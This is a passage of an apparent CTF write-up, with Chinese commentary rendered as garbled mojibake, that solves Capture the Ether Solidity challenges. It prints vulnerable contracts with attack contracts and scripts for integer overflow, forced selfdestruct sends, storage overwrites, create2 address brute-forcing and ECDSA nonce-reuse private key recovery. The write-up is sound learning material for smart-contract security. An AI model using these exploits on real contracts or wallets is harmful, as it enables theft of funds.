^0.4.21;\n\ncontract TokenSaleChallenge &#123;\n    mapping(address => uint256) public balanceOf;\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\n\n    function TokenSaleChallenge(address _player) public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance &lt; 1 ether;\n    &#125;\n\n    function buy(uint256 numTokens) public payable &#123;\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\n\n        balanceOf[msg.sender] += numTokens;\n    &#125;\n\n    function sell(uint256 numTokens) public &#123;\n        require(balanceOf[msg.sender] >= numTokens);\n\n        balanceOf[msg.sender] -= numTokens;\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n    &#125;\n&#125;\n\nAnalyzebuyå‡½æ•°ä¸­require msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKENï¼Œå…¶ä¸­PRICE_PER_TOKENå›ºå®šä¸º1 etherï¼Œè€ŒnumTokensã€‚\nrequireç›´æŽ¥è¿›è¡Œä¹˜æ³•ï¼Œåœ¨æ­¤å¤„å¯ä»¥æž„é€ æ•´æ•°æº¢å‡ºæ¼æ´žã€‚\nAttackcontract attack&#123;\n\tfunction div() public view returns(uint256)&#123;\n        return ((uint256(-1)/1 ether)+1)*1 ether;\n    &#125;\n&#125;\n\nèŽ·å¾—èƒ½å¤Ÿé€ æˆæº¢å‡ºçš„æ•°å€¼ï¼Œä½œä¸ºå‚æ•°è°ƒç”¨sellå³å¯\n2.Token whaleCodepragma solidity ^0.4.21;\n\ncontract TokenWhaleChallenge &#123;\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleChallenge(address _player) public &#123;\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return balanceOf[player] >= 1000000;\n    &#125;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal &#123;\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    &#125;\n\n    function transfer(address to, uint256 value) public &#123;\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    &#125;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    function approve(address spender, uint256 value) public &#123;\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    &#125;\n\n    function transferFrom(address from, address to, uint256 value) public &#123;\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    &#125;\n&#125;\n\nAnalyzetransferFromå‡½æ•°å­˜åœ¨é—®é¢˜ï¼Œåº”è¯¥éªŒè¯allowance[from] [to] &gt;&#x3D; valueç»“æžœå´éªŒè¯allowance[from] [msg.sender] &gt;&#x3D; valueï¼Œæ‰€ä»¥è€Œä¸”æœ€ç»ˆå‡å°‘çš„æ˜¯msg.senderçš„ä½™é¢ï¼Œé¢˜ç›®åˆçº¦æ€»å…±æœ‰1000tokenï¼Œè€Œè¦æ±‚èŽ·å¾—1000000tokenï¼Œæ²¡æœ‰mintæ–¹å¼ï¼Œåªèƒ½æž„é€ æº¢å‡ºæ¼æ´žã€‚\nå…ˆæž„å»ºæ”»å‡»åˆçº¦ç”¨æ¥èŽ·å¾—allowenceä½¿allowance[from] [msg.sender] &gt;&#x3D; valueä¸ºçœŸï¼Œæ‰€ä»¥æ”»å‡»åˆçº¦éœ€è¦èƒ½å¤Ÿè°ƒç”¨approveå‡½æ•°ã€‚\nAttacké¦–å…ˆå‘æ”»å‡»åˆçº¦ä¸­è½¬è´¦600tokenï¼Œå†è°ƒç”¨getallowå°†600tokenå…¨éƒ¨æŽˆæƒç»™player\ncontract attack&#123;\n    TokenWhaleChallenge target=TokenWhaleChallenge(0x9d83e140330758a8fFD07F8Bd73e86ebcA8a5692);\n    function getallow(address spender,uint value) public&#123;\n        target.approve(spender,value);\n    &#125; \n\nä»¥playerèº«ä»½è°ƒç”¨transferfromï¼Œfromåœ°å€ä¸ºæ”»å‡»åˆçº¦åœ°å€ï¼Œæ­¤æ—¶ç¬¬ä¸€æ¡requireæ»¡è¶³ï¼Œtoè®¾ç½®600ï¼Œç¬¬äºŒæ¡æ»¡è¶³ï¼Œç”±äºŽå·²ç»è¿›è¡Œè¿‡æ”»å‡»åˆçº¦è°ƒç”¨ï¼Œæ‰€ä»¥ç¬¬ä¸‰æ¡æ»¡è¶³ï¼Œæ­¤æ—¶åªéœ€è¦toä¸ºä»»æ„åœ°å€ï¼Œvalue&gt;500å¹¶ä¸”value&lt;&#x3D;600å³å¯æž„é€ balanceof[player]çš„ä¸‹æº¢å¤„\n3.Retirement fundCodepragma solidity ^0.4.21;\n\ncontract RetirementFundChallenge &#123;\n    uint256 startBalance;\n    address owner = msg.sender;\n    address beneficiary;\n    uint256 expiration = now + 10 years;\n\n    function RetirementFundChallenge(address player) public payable &#123;\n        require(msg.value == 1 ether);\n\n        beneficiary = player;\n        startBalance = msg.value;\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function withdraw() public &#123;\n        require(msg.sender == owner);\n\n        if (now &lt; expiration) &#123;\n            // early withdrawal incurs a 10% penalty\n            msg.sender.transfer(address(this).balance * 9 / 10);\n        &#125; else &#123;\n            msg.sender.transfer(address(this).balance);\n        &#125;\n    &#125;//å› requireé™åˆ¶ï¼Œè¯¥å‡½æ•°è°ƒç”¨ä¸€å®šå¤±è´¥\n\n    function collectPenalty() public &#123;\n        require(msg.sender == beneficiary);\n\n        uint256 withdrawn = startBalance - address(this).balance;//å­˜åœ¨æº¢å‡ºå¯ä»¥ä½¿å¾—withdrawå¤§äºŽ0\n\n        // an early withdrawal occurred\n        require(withdrawn > 0);\n\n        // penalty is what's left\n        msg.sender.transfer(address(this).balance);\n    &#125;//ä»…å‰©è¯¥å‡½æ•°å¯è¿›è¡Œè°ƒç”¨ï¼Œæ¼æ´žä¸€å®šåœ¨æ­¤å¤„ã€‚\n&#125;\n\nAnalyzeå› ä¸ºå­˜åœ¨æº¢å‡ºæ¼æ´žï¼Œæ‰€ä»¥åªéœ€address(this).balanceå¤§äºŽstartbalanceå³å¯ï¼Œé—®é¢˜åœ¨äºŽåˆçº¦ä¸­æ²¡æœ‰fallback()ï¼Œreceive()æˆ–function()ï¼Œæ‰€ä»¥ä½¿ç”¨è‡ªæ¯çš„æ–¹å¼å‘è¢«æ”»å‡»åˆçº¦ä¸­è½¬å…¥ä¸€å®šçš„ethæž„é€ withdrawn ä¸‹æº¢å¤„å†è¿›è¡ŒcollectPenalty()å‡½æ•°è°ƒç”¨å³å¯\nAttackcontract attack&#123;\n    function kill(address addr) public payable&#123;\n        selfdestruct(addr);\n    &#125;\n&#125;\n\n4.MappingCodepragma solidity ^0.4.21;\n\ncontract MappingChallenge &#123;\n    bool public isComplete;\n    uint256[] map;\n\n    function set(uint256 key, uint256 value) public &#123;\n        // Expand dynamic array as needed\n        if (map.length &lt;= key) &#123;\n            map.length = key + 1;\n        &#125;\n\n        map[key] = value;\n    &#125;map.lengthæœ€å¤§ä¸º2**256ï¼Œæ‰€ä»¥keyåº”ä¸º2**256-1-1\n\n    function get(uint256 key) public view returns (uint256) &#123;\n        return map[key];\n    &#125;\n&#125;\n\nAnalyzemap.lengthæº¢å‡ºåŽå¯¹boolè¿›è¡Œè¦†ç›–,ç±»ä¼¼ethernautä¸­çš„aliencodexï¼Œä¹‹å‰çš„åšå®¢å‘è¿‡ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ã€‚\nAttackcontract Attack &#123;\n    MappingChallenge target=MappingChallenge(0xC3Ba5050Ec45990f76474163c5bA673c244aaECA);\n    function pwn() public &#123;\n        target.set(uint256(-1)-1,0);\n    &#125;\n    function pwn2()public&#123;\n        target.set(0-uint(keccak256(abi.encode(uint(1)))),1);\n    &#125;\n&#125;\n\næ­¤æ—¶map.lengthä¸º2**256-1ï¼Œmap[x]çš„å­˜å‚¨åœ°å€ä¸ºkeccak256(slot(map)),æ­¤å¤„slot(map)ä¸º1ï¼Œmap[x]å­˜å‚¨åœ°å€ä¸ºkeccak256(slot(map))+x,æ‰€ä»¥æž„é€ xä¸º 2^256-keccak256(1),å­˜å‚¨å…¶å€¼ä¸º1ï¼Œå³å¯è¦†ç›–slot(0)ä¸­çš„boolã€‚\n5.Donationcodepragma solidity ^0.4.21;\n\ncontract DonationChallenge &#123;\n    struct Donation &#123;\n        uint256 timestamp;\n        uint256 etherAmount;\n    &#125;\n    Donation[] public donations;\n\n    address public owner;\n\n    function DonationChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n        \n        owner = msg.sender;\n    &#125;\n    \n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function donate(uint256 etherAmount) public payable &#123;\n        // amount is in ether, but msg.value is in wei\n        uint256 scale = 10**18 * 1 ether;\n        require(msg.value == etherAmount / scale);\n\n        Donation donation;\n        donation.timestamp = now;\n        donation.etherAmount = etherAmount;\n\n        donations.push(donation);\n    &#125;\n\n    function withdraw() public &#123;\n        require(msg.sender == owner);\n        \n        msg.sender.transfer(address(this).balance);\n    &#125;\n&#125;\n\nAnalyze&amp;Attackæ‰§è¡Œdonateæ—¶Donationåˆå§‹åŒ–å¹¶ä¼ å…¥å¯¹åº”å‚æ•°ï¼Œæ²¡æœ‰å¼ºè°ƒmemoryï¼Œæ‰€ä»¥å ç”¨storageï¼Œå®žé™…ä¿®æ”¹å€¼ä¸ºslot0ä»¥åŠslot1ï¼Œæ‰€ä»¥å°†etherAmountä¸ºint(address(player),16)å³å¯ä¿®æ”¹ownerä¸ºplayerã€‚\n6.Fifty yearsCodepragma solidity ^0.4.21;\n\ncontract FiftyYearsChallenge &#123;\n    struct Contribution &#123;\n        uint256 amount;\n        uint256 unlockTimestamp;\n    &#125;\n    Contribution[] queue;\n    uint256 head;\n\n    address owner;\n    function FiftyYearsChallenge(address player) public payable &#123;\n        require(msg.value == 1 ether);\n\n        owner = player;\n        queue.push(Contribution(msg.value, now + 50 years));\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function upsert(uint256 index, uint256 timestamp) public payable &#123;\n        require(msg.sender == owner);\n\n        if (index >= head &amp;&amp; index &lt; queue.length) &#123;\n            // Update existing contribution amount without updating timestamp.\n            Contribution storage contribution = queue[index];\n            contribution.amount += msg.value;\n        &#125; else &#123;\n            // Append a new contribution. Require that each contribution unlock\n            // at least 1 day after the previous one.\n            require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);\n\n            contribution.amount = msg.value;\n            contribution.unlockTimestamp = timestamp;\n            queue.push(contribution);\n        &#125;\n    &#125;\n\n    function withdraw(uint256 index) public &#123;\n        require(msg.sender == owner);\n        require(now >= queue[index].unlockTimestamp);\n\n        // Withdraw this and any earlier contributions.\n        uint256 total = 0;\n        for (uint256 i = head; i &lt;= index; i++) &#123;\n            total += queue[i].amount;\n\n            // Reclaim storage.\n            delete queue[i];\n        &#125;\n\n        // Move the head of the queue forward so we don't have to loop over\n        // already-withdrawn contributions.\n        head = index + 1;\n\n        msg.sender.transfer(total);\n    &#125;\n&#125;\n\nAnalyzeçœ‹åˆ°äº†ç»“æž„ä½“ï¼Œæƒ³åˆ°äº†æœªåˆå§‹åŒ–çš„å­˜å‚¨æŒ‡é’ˆé—®é¢˜ï¼Œä½†æ˜¯è¿›è¡Œäº†mappingå¹¶ä¸”å£°æ˜Žäº†storageï¼Œç›¸å½“äºŽé¢„é˜²äº†è¯¥é—®é¢˜ï¼Œæ‰€ä»¥åˆ‡å…¥ç‚¹ä¸åœ¨è¿™é‡Œã€‚\nåˆ†æžupsert()å‡½æ•°ä¸‹çš„elseä¸‹çš„ä»£ç ï¼Œrequire()ä¸­å­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´žï¼Œqueue[queue.length - 1].unlockTimestamp + 1 dayså¯ä»¥æº¢å‡ºä¸ºä¸€ä¸ªéžå¸¸å°çš„æ•°å­—ã€‚æ‰€ä»¥ä½¿indexä¸æ»¡è¶³ifæ¡ä»¶ï¼Œè®¾ç½®èƒ½å¤Ÿé€ æˆæº¢å‡ºçš„timestampï¼Œè°ƒç”¨upsert()å‡½æ•°ã€‚\nä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯è°ƒç”¨å®Œæˆä¹‹åŽqueue.lengthè¦å˜æˆ2ï¼Œå› ä¸ºelseä¸‹æ²¡æœ‰è¿›è¡Œé¢„é˜²ï¼Œcontribution.amount &#x3D; msg.valueä¸€å¥ä¼šè¦†ç›–Contribution[] queueä¸ºmsg.value(è¿™é‡Œæ˜¯1 wei)ï¼Œç„¶åŽå†ä»£ç ç»“å°¾å¤„åˆqueue.push(contribution)ï¼Œæ‰€ä»¥å˜ä¸ºäº†2ã€‚æ­¤æ—¶headå·²ç»è¢«è¦†ç›–æˆäº†uint256(0-1 days)ï¼Œæ­¤æ—¶ä½™é¢ä¸º1 ether+1 weiã€‚\næ³¨æ„ï¼Œå†æ¬¡è°ƒç”¨upsert()å‡½æ•°queue.lengthè¿˜éœ€è¦æ˜¯2ï¼Œå› ä¸ºå¦‚æžœåªæœ‰1çš„è¯ï¼Œqueue[0].amountå°†ä¼šæ˜¯1ï¼Œwithdrawä¹‹åŽä¸èƒ½è®©åˆçº¦ä½™é¢å½’é›¶ï¼Œå¦‚æžœæ˜¯3çš„è¯ï¼ŒåŒæ ·è°ƒç”¨æ—¶msg.valueä¸º1weiï¼Œqueue[0].amountæ˜¯1 etherï¼Œqueue[1].amountæ˜¯2weiï¼Œqueue[2].amountæ˜¯3 weiï¼Œç›¸åŠ ç­‰äºŽ1 ether+2 wei+3 weiï¼Œè€Œåˆçº¦ä½™é¢åªæœ‰1 ether+2 weiï¼Œä¼šé€ æˆwithdrawå‡½æ•°è°ƒç”¨å¤±è´¥.\nå†æ¬¡è°ƒç”¨upsert()å‡½æ•°ï¼Œmsg.valueè¿˜æ˜¯1weiï¼ˆç›®çš„æ˜¯queue.lengthä¸º2ï¼‰ï¼Œè°ƒç”¨ä¹‹åŽä»»æ„indexéƒ½å°†ä¸æ»¡è¶³ifæ¡ä»¶ï¼Œå¹¶ä¸”æ­¤æ—¶çš„timestampå·²ç»å¯ä»¥è®¾ç½®ä¸º0ï¼Œå› ä¸ºæ­¤æ—¶queue[queue.length - 1].unlockTimestamp&#x3D;uint256(0-1 days)ï¼Œtimestampä¸º0å¯ä»¥æ»¡è¶³queue[queue.length - 1].unlockTimestamp + 1 daysæ¡ä»¶(ç›¸åŠ æ°å¥½æº¢å‡ºä¸º0)ï¼Œå¹¶ä¸”åœ¨è°ƒç”¨å®ŒåŽheadè¢«è¦†ç›–ä¸º0ã€‚æ­¤æ—¶queue[0].amountæ˜¯1 etherï¼Œqueue[1].amountæ˜¯2weiï¼Œå¹¶ä¸”åˆçº¦ä½™é¢æ˜¯1 ether+2 weiï¼Œæ°å¥½æ»¡è¶³æ¡ä»¶å¯ä»¥è°ƒç”¨withdrawå‡½æ•°ã€‚\nè‡³äºŽä¸Šè¿°ä¸ºä»€ä¹ˆmsg.valueä¸º1 weiæ—¶ï¼Œamountå´ç­‰äºŽ2ï¼ŒåŽŸå› å°±æ˜¯contribution.amountæ˜¯è¯»å–çš„æ•°ç»„é•¿åº¦ï¼Œåœ¨è¿›è¡Œpushæ—¶æ•°ç»„é•¿åº¦åŠ 1ï¼Œè€Œwithdrawå‡½æ•°ä¸­æ²¡æœ‰å£°æ˜Žstroageå¯¼è‡´queue[i].amountå°±æ˜¯queueæ•°ç»„çš„é•¿åº¦å³queue.lengthã€‚å‚è€ƒæˆ‘å†™è¿‡çš„ä¸€ç¯‡åšå®¢æ™ºèƒ½åˆçº¦åŸºç¡€æ¼æ´žæ±‡æ€»ä¸­çš„&#x3D;&#x3D;&gt;6.æœªåˆå§‹åŒ–çš„å­˜å‚¨æŒ‡é’ˆ\nå› ä¸ºè¿™ä¸ªæ—¶å€™nowä¸€å®šå¤§äºŽ0ï¼Œæ‰€ä»¥æ»¡è¶³withdrawä¸‹çš„requireæ¡ä»¶ï¼Œä½¿ç”¨1ï¼ˆqueue.length - 1ï¼‰ä¸ºå‚æ•°è°ƒç”¨withdrawå³å¯å–èµ°å…¨éƒ¨çš„ethï¼Œå®ŒæˆæŒ‘æˆ˜ã€‚\nè¿™é“é¢˜æ¯”è¾ƒæ·±å…¥çš„è€ƒå¯Ÿäº†æœªåˆå§‹åŒ–å­˜å‚¨æŒ‡é’ˆæ¼æ´žçš„åŽŸç†ï¼Œä½œä¸ºé¢˜åº“ä¸­åˆ†æ•°æœ€é«˜çš„ä¸€é“é¢˜ï¼Œè¿™ä¸ªchallengeè¿˜æ˜¯éžå¸¸æœ‰å«é‡‘é‡çš„ã€‚\nAttackå…ˆè°ƒç”¨upsert(1,uint256(0-1 days))msg.valueä¸º1 weiï¼Œå†è°ƒç”¨upsert(1,0)msg.valueä¸º1ï¼Œåœ¨è°ƒç”¨withdraw(1)å³å¯ã€‚\nhttps://ropsten.etherscan.io/address/0x3BDFf2a063A3F16497F2E7dFBAcc10fDc452AD01\nAccounts1.Fuzzy identitypragma solidity ^0.4.21;\n\ninterface IName &#123;\n    function name() external view returns (bytes32);\n&#125;\n\ncontract FuzzyIdentityChallenge &#123;\n    bool public isComplete;\n\n    function authenticate() public &#123;\n        require(isSmarx(msg.sender));\n        require(isBadCode(msg.sender));\n\n        isComplete = true;\n    &#125;\n\n    function isSmarx(address addr) internal view returns (bool) &#123;\n        return IName(addr).name() == bytes32(\"smarx\");\n    &#125;\n\n    function isBadCode(address _addr) internal pure returns (bool) &#123;\n        bytes20 addr = bytes20(_addr);\n        bytes20 id = hex\"000000000000000000000000000000000badc0de\";\n        bytes20 mask = hex\"000000000000000000000000000000000fffffff\";\n\n        for (uint256 i = 0; i &lt; 34; i++) &#123;\n            if (addr &amp; mask == id) &#123;\n                return true;\n            &#125;\n            mask &lt;&lt;= 4;\n            id &lt;&lt;= 4;\n        &#125;\n\n        return false;\n    &#125;\n&#125;\n\nAnalyzeé¢˜ç›®è¦æ±‚msg.senderåœ°å€ä¸­å«æœ‰badc0deå­—ç¬¦ï¼Œä¸»è¦è€ƒå¯Ÿåˆçº¦åœ°å€è®¡ç®—ï¼Œcreate2ç®—æ³•ï¼Œä¹‹å‰æœ‰åšå®¢å‘è¿‡å¯ä»¥å‚è€ƒæ ¹æ®ä¸¤é“é¢˜ç›®ç†è§£createåŠcreate2ç®—æ³•ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚\nAttackéƒ¨ç½²åˆçº¦æ‰€ç”¨ä»£ç ï¼š\ncontract Deployer &#123;\n    // contractBytecodeæ˜¯å¾…éƒ¨ç½²åˆçº¦çš„bytecode\n    address public a;\n    bytes code = hex\"your code\";\n    function deploy(uint salt) internal returns (address)&#123;\n        bytes memory bytecode = code;\n        address addr;\n      \n        assembly &#123;\n          addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)\n        &#125;\n        return addr;\n    &#125;\n    function get(uint salt)public &#123;\n        a=deploy(salt);\n    &#125;\n&#125;\n\næ‰€éƒ¨ç½²åˆçº¦çš„ä»£ç ï¼š\ncontract IName&#123;\n    bytes32 public name=bytes32(\"smarx\");\n    fu target=fu(0x553c7E7D4bA3F92d85C009CaCB2b995d9e3C79B7);\n    function pwn()public&#123;\n        target.authenticate();\n    &#125;\n&#125;\n\nçˆ†ç ´åœ°å€æ‰€ç”¨ä»£ç ï¼š\nfrom web3 import Web3,HTTPProvider\n\ndeployingAddr='2bA2D4a1B728D87E9319ce51B3F5086a78f945d9'\n\ncode='60806040527f736d61727800000000000000000000000000000000000000000000000000000060005573553c7e7d4ba3f92d85c009cacb2b995d9e3c79b7600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561008957600080fd5b50610119806100996000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806306fdde03146037578063dd365b8b146053575b600080fd5b603d605b565b6040518082815260200191505060405180910390f35b60596061565b005b60005481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b15801560ca57600080fd5b505af115801560dd573d6000803e3d6000fd5b5050505056fea2646970667358221220434aa07aa1939601b3982d4fefcf99b542f6bc06572ed87993a90d2ff7cf687c64736f6c63430006000033'\n\n//å¾…éƒ¨ç½²åˆçº¦çš„bytecode\n\ns=Web3.keccak(hexstr=code)\n\na=''.join(['%02x' % b for b in s])//å°†sè½¬å˜ä¸ºå­—èŠ‚\n\ni=0\n\nwhile(1):\n    salt=hex(i)[2:].rjust(64,'0')\n    print(salt)\n    p=Web3.keccak(hexstr=('0xff' + deployingAddr + salt + a))[12:].hex()\n    if 'badc0de' in p:\n        print(salt,p)\n        break\n    i+=1\n\n2.Public KeyCodepragma solidity ^0.4.21;\n\ncontract PublicKeyChallenge &#123;\n    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;\n    bool public isComplete;\n\n    function authenticate(bytes publicKey) public &#123;\n        require(address(keccak256(publicKey)) == owner);\n\n        isComplete = true;\n    &#125;\n&#125;\n\nAnalyzeä¸»è¦è€ƒæŸ¥äº†å…¬é’¥è®¡ç®—ï¼Œç»äº†è§£å·²çŸ¥äº¤æ˜“çš„rsvä»¥åŠhashæ˜¯å¯ä»¥è®¡ç®—publickeyçš„ï¼Œæ‰“å¼€åŒºå—é“¾æµè§ˆå™¨ï¼Œæ‰¾åˆ°ownerå‘èµ·çš„ä»»ä¸€äº¤æ˜“ã€‚\néœ€è¦ç”¨åˆ°jsä»£ç \nAttackconst &#123; ethers &#125; = require('./ethers')\nlet provider =new ethers.providers.InfuraProvider('ropsten');\nconsole.log(provider._isProvider)\nlet transactionHash=\"0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb\"\nprovider.getTransaction(transactionHash).then((firstTx) => &#123;\nconsole.log(firstTx);\n    const txData = &#123;\n        gasPrice: firstTx.gasPrice,\n        gasLimit: firstTx.gasLimit,\n        value: firstTx.value,\n        nonce: firstTx.nonce,\n        data: firstTx.data,\n        to: firstTx.to,\n        chainId: firstTx.chainId,\n    &#125;;\n    const signingData = ethers.utils.serializeTransaction(txData);\n    const msgHash = ethers.utils.keccak256(signingData);\n    const signature = &#123; r: firstTx.r, s: firstTx.s, v: firstTx.v &#125;;\n    let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);\n    console.log(rawPublicKey)\n   \n    rawPublicKey = `0x$&#123;rawPublicKey.slice(4)&#125;`;\n    console.log(`Recovered public key $&#123;rawPublicKey&#125;`);\n    const address = ethers.utils.keccak256(rawPublicKey).slice(26);\n    console.log(`0x$&#123;address&#125;`)\n&#125;);\n\n\nå¾—åˆ°ç»“æžœpublickeyä¸º0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4\n3.Account TakeoverCodepragma solidity ^0.4.21;\n\ncontract AccountTakeoverChallenge &#123;\n    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;\n    bool public isComplete;\n\n    function authenticate() public &#123;\n        require(msg.sender == owner);\n\n        isComplete = true;\n    &#125;\n&#125;\n\nAnalyzeé¢˜ç›®ä»£ç åªæœ‰çŸ­çŸ­å‡ è¡Œï¼Œåˆ†æžèµ·æ¥å¾ˆç®€å•ï¼Œéœ€è¦ownerè°ƒç”¨å‡½æ•°å³å¯é€šå…³ã€‚\nä¸è¿‡æˆ‘ä»¬è‡ªèº«æ˜¾ç„¶ä¸æ˜¯ownerï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰æä¾›ä»»ä½•å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–çš„æ¼æ´žï¼Œæ‰€ä»¥è¿™é“é¢˜çœ‹èµ·æ¥ä¼¼ä¹Žä¸å¯èƒ½ã€‚\nè¿™é“é¢˜åˆšçœ‹èµ·æ¥ä¹Ÿæ˜¯äº‘é‡Œé›¾é‡Œçš„æ²¡æœ‰æ€è·¯ï¼ŒæŸ¥è¯¢äº†ä¸€äº›èµ„æ–™ä»¥åŠçœ‹äº†å¤§ä½¬ä»¬çš„wpä¹‹åŽæ˜Žç™½äº†è€ƒå¯Ÿçš„é—®é¢˜ï¼ŒSMARXå‘è¡¨è¿‡è¯´è¯¥ownerä¸‹åªæœ‰å‰ä¸¤ç¬”äº¤æ˜“æ˜¯æ¥æºäºŽä»–è‡ªå·±ï¼Œæ˜¾ç„¶åˆ‡å…¥ç‚¹åœ¨æ­¤ã€‚\näº†è§£åˆ°ä¸¤ç¬”äº¤æ˜“ä¸­å¦‚æžœrç›¸åŒï¼Œåˆ™ä»–ä»¬ä½¿ç”¨äº†ç›¸åŒçš„éšæœºæ•°kï¼Œè€Œé‡å¤çš„éšæœºæ•°å¯ä»¥è®¡ç®—è´¦æˆ·å¯†é’¥ï¼Œå¾—åˆ°å¯†é’¥å³å¯å¯¼å…¥è´¦æˆ·ï¼Œåœ¨è¿›è¡Œè°ƒç”¨å³å¯é€šå…³\nd &#x3D; (sk-z)&#x2F;r&#x3D; (sk-z) * inverse_mod(r, p) % p\nk &#x3D; (z1-z2)&#x2F;(s1-s2)&#x3D; (z1 â€“ z2)*inverse_mod(s1 â€“ s2,p)%p\nå‚è€ƒï¼šhttps://xz.aliyun.com/t/2718\næ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼šhttps://xz.aliyun.com/t/6295\nAttackconst EthereumTx = require('./ethereumjs-tx').Transaction\nconst &#123; buffer &#125; = require('stream/consumers')\nconst &#123; ethers &#125; = require('./ethers')\nlet provider =new ethers.providers.InfuraProvider('ropsten');\n// const firstTx=provider.getTransaction('0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396').then((firstTx)=> &#123;\n//     console.log(firstTx);&#125;);\nvar rawTx1 =&#123;\n    nonce: 0,\n    gasPrice: '0x3b9aca00',\n    gasLimit: '0x5208',\n    to: '0x92b28647ae1f3264661f72fb2eb9625a89d88a31',\n    value: '0x1111d67bb1bb0000',\n    data: '0x',\n    v: '0x29',\n    r: '0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166',\n    s: '0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8'\n  &#125;\n//   const secondTx=provider.getTransaction('0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009').then((secondTx)=> &#123;\n//     console.log(secondTx);&#125;);\n  var rawTx2 =&#123;\n    nonce: 1,\n    gasPrice: '0x3b9aca00',\n    gasLimit: '0x5208',\n    to: '0x92b28647ae1f3264661f72fb2eb9625a89d88a31',\n    value: '0x1922e95bca330e00',\n    data: '0x',\n    v: '0x29',\n    r: '0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166',\n    s: '0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de'\n  &#125;\n  const tx1 = new EthereumTx(rawTx1,&#123;chain: 'ropsten', hardfork: 'petersburg'&#125;)\n  const tx2 = new EthereumTx(rawTx2,&#123;chain: 'ropsten', hardfork: 'petersburg'&#125;)\n  const z1 = tx1.hash(false).toString(\"hex\");\n  const z2 = tx2.hash(false).toString(\"hex\");\nconsole.log(z1);\nconsole.log(z2);\n\næ³¨æ„z1å’Œz2å¤„ï¼Œè¿™ä¸ªåº“ä¸­çš„ hash å‡½æ•°æ­¤æ—¶è¦é€‰æ‹©å‚æ•° falseï¼Œå› ä¸ºå‚æ•°ä¸º false æ—¶è¿›è¡Œ hash çš„å¯¹è±¡æ˜¯ä¸åŠ å…¥ç­¾åä¿¡æ¯çš„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ z å€¼ï¼Œå¦åˆ™é»˜è®¤çš„å‚æ•°ä¸º true å¾—åˆ°çš„å°±æ˜¯æ·»åŠ äº†ç­¾åä¿¡æ¯çš„ hash å€¼ï¼Œå¾—åˆ°çš„å…¶å®žå°±æ˜¯æˆ‘ä»¬çš„äº¤æ˜“ hash\nè§£å‡ºç§é’¥\nfrom ecdsa.numbertheory import inverse_mod\ndef derivate_privkey(p, r, s1, s2, z1, z2):\n    z = z1 - z2\n    s = s1 - s2\n    r_inv = inverse_mod(r, p)\n    s_inv = inverse_mod(s, p)\n    k = (z * s_inv) % p\n    d = (r_inv * (s1 * k - z1)) % p\n    return d, k\n\nz1 = 0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c\ns1 = 0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de\nr = 0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166\nz2 = 0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04\ns2 = 0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8\np  = 